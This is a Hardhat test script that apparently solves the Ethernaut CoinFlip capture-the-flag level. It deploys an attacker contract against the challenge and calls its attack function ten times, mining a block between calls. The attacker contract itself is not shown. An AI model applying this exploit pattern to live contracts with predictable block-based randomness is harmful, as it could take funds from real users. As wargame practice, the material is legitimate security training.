import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`CoinFlip`);
  const challengeAddress = await createChallenge(
    `0x4dF32584890A0026e56f7535d0f2C6486753624f`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  const attackerFactory = await ethers.getContractFactory(`CoinFlipAttacker`);
  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
  // need to win 10 times
  for (let i = 0; i < 10; i++) {
    tx = await attacker.attack();
    await tx.wait();

    // simulate waiting 1 block
    await ethers.provider.send("evm_increaseTime", [1]); // add 1 second
    await ethers.provider.send("evm_mine", [
      /* timestamp */
    ]); // mine the next block
    console.log(await ethers.provider.getBlockNumber());
  }
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
